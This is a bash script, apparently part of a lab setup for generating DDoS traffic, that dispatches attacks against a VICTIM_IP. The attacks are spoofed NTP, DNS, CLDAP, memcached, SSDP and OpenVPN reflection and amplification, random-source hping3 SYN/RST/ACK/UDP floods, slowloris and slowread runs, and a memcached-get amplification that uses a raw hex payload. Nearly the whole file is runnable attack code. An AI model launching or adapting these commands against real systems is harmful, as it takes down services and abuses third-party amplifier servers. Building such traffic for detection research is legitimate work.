#!/bin/bash

source /root/ddos_scripts/attack_spec.sh

RED='\033[0;31m' # RED Color
NC='\033[0m' # No Color
YELLOW='\033[0;33m'

before_attack() {
    #
    # Do stuff before each attack
    #
    echo "Attacker commands will be run on: $( uname -a )"
    echo "They are executed by: $( whoami )"
    iptables -N attacker_out
    iptables -A attacker_out
    case "$ATTACK_TYPE" in
        "response")
            iptables -A OUTPUT --destination $AMP_SERVER_IP -j attacker_out ;;
        *)
            iptables -A OUTPUT --destination $VICTIM_IP -j attacker_out    ;;
    esac
}

attack_response() {
    #
    # Perform attack which generate response
    #
    case "$ATTACK_VECTOR" in
        "ntp")
            pushd /root/ddos_scripts/ntpdos
            perl ntp_attack_prl.pl $AMP_SERVER_IP $VICTIM_IP $PKTS
            popd
            ;;
        "openvpn")
            local tmp_dir

            pushd /root/ddos_scripts/openvpn
            tmp_dir=`mktemp -d -p $(pwd)`
            for i in {1..9}; do
            bash replay_openvpn_response.sh $VICTIM_IP $LOOPS $tmp_dir &
            sleep 0.5
            done
            bash replay_openvpn_response.sh $VICTIM_IP $LOOPS $tmp_dir
            rm -r $tmp_dir
            popd
            ;;
        "dns")
            pushd /root/ddos_scripts/dns
            echo $AMP_SERVER_IP > local_server.txt
            ./dns $VICTIM_IP $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $TIME
            popd
            ;;
        "cldap")
            pushd /root/ddos_scripts/cldap
            bash replay_cldap_response.sh $VICTIM_IP $LOOPS
            popd
            ;;
        "memcached-stat")
            pushd /root/ddos_scripts/memcache
            echo $AMP_SERVER_IP > local_server.txt
            ./mem_cache_c $VICTIM_IP $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $__PKTS_PER_SECONDS $TIME
            popd
            ;;
        "ssdp")
            pushd /root/ddos_scripts/ssdp
            bash replay_ssdp_response.sh $VICTIM_IP $LOOPS
            popd
            ;;
    esac
}

attack_query() {
    #
    # Perform attack which generate queries
    #
    case "$ATTACK_VECTOR" in
        "ntp")
            pushd /root/ddos_scripts/ntpdos
            perl ntp_attack_prl.pl $VICTIM_IP $__SOURCE_IP_QUERY $PKTS
            popd
            ;;
        "openvpn")
            local tmp_dir

            pushd /root/ddos_scripts/openvpn
            tmp_dir=`mktemp -d -p $(pwd)`
            bash replay_openvpn_querry.sh $VICTIM_IP $LOOPS $TEMP_DIR
            rm -r $tmp_dir
            popd
            ;;
        "dns")
            pushd /root/ddos_scripts/dns
            echo $VICTIM_IP > local_server.txt
            ./dns $__SOURCE_IP_QUERY $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $TIME
            popd
            ;;
        "cldap")
            pushd /root/ddos_scripts/cldap
            bash replay_cldap_querry.sh $VICTIM_IP $LOOPS
            popd
            ;;
        "memcached-stat")
            pushd /root/ddos_scripts/memcache
            echo $VICTIM_IP > local_server.txt
            ./mem_cache_c $__SOURCE_IP_QUERY $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $__PKTS_PER_SECONDS $TIME
            popd
            ;;
        "ssdp")
            pushd /root/ddos_scripts/ssdp
            bash replay_ssdp_querry.sh $VICTIM_IP $LOOPS
            popd
            ;;
    esac
}

attack_flood() {
    #
    # Perfrorm flood attack
    #

    case "$ATTACK_VECTOR" in
        "flood-syn")
            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -S "$VICTIM_IP"    ;;
#            hping3 --rand-source --faster -c 20 -p $__TARGET_PORT_FLOOD -L 0 -S "$VICTIM_IP"    ;;
        "flood-rst")
            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -b -R "$VICTIM_IP" ;;
        "flood-ack")
            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -A "$VICTIM_IP"    ;;
        "flood-udp")
            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD --udp "$VICTIM_IP"      ;;
        "flood-all")
            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -A "$VICTIM_IP"    &
            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -b -R "$VICTIM_IP" &
            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD --udp "$VICTIM_IP"      &
            timeout $TIME hping3 --rand-source --flood -p $__TARGET_PORT_FLOOD -L 0 -S "$VICTIM_IP"
            ;;
    esac
}

attack_slow() {
    #
    # Slow attacks using slowhttptest utility
    #
    case "$ATTACK_VECTOR" in
        slowloris)
            slowhttptest -c $__NUMBER_OF_CONNECTIONS -H -i $__INTERVAL_BETWEEN_MESSAGES -l $TIME \
                -r $__CONNECTIONS_PER_SECOND -t GET -u "http://$VICTIM_IP" -g -x $__DATA_LENGTH
            ;;
        slowread)
            slowhttptest -c $__NUMBER_OF_CONNECTIONS -X -r $__CONNECTIONS_PER_SECOND -w $__WINDOW_START \
               -y $__WINDOW_END -n $__INTERVAL_BETWEEN_READ -z $__BYTES_READ -k $__REPEAT_REQ \
                -g -l $TIME -u "http://$VICTIM_IP/slowread_file.txt"
            ;;
    esac
}

attack_mem_get() {
    #
    # Memcached-get attack is treated separately for now
    #

    # Upload data to server
    pushd /root/ddos_scripts/memcache
    python3 set_data.py $AMP_SERVER_IP
    # Wait just in case
    sleep 1

    # Send GET requests for uploaded data
    local exploit_data='\x00\x01\x00\x00\x00\x01\x00\x00\x67\x65\x74\x20\x78\x61\x68\x0d\x0a\x0a'
    nping -c $PKTS --rate $__RATE --udp -S $VICTIM_IP -g $__TARGET_PORT -p 11211 -N --data $exploit_data $AMP_SERVER_IP >mem-get.out
}


after_attack() {
    #
    # Do situff after each attack
    #

    # Make sure that all packets arrive to the destination
    echo -e "${YELLOW}$(iptables -vnL attacker_out)${NC}"
    iptables -F
    iptables -X
    sleep 1
}



#### MAIN

before_attack

case "$ATTACK_VECTOR" in
    cldap|dns|ntp|ssdp|memcached-stat|openvpn)
        case "$ATTACK_TYPE" in
            "response")
                attack_response ;;
            "query")
                attack_query   ;;
            *)
                echo -e "${RED}Wrong attack type argument: '$ATTACK_TYPE'!${NC}"
                exit 1
                ;;
        esac
        ;;
    slowloris|slowread)
        attack_slow         ;;
    memcached-get)
        attack_mem_get      ;;
    # All other options should be flood
    *)
        attack_flood        ;;
esac

after_attack
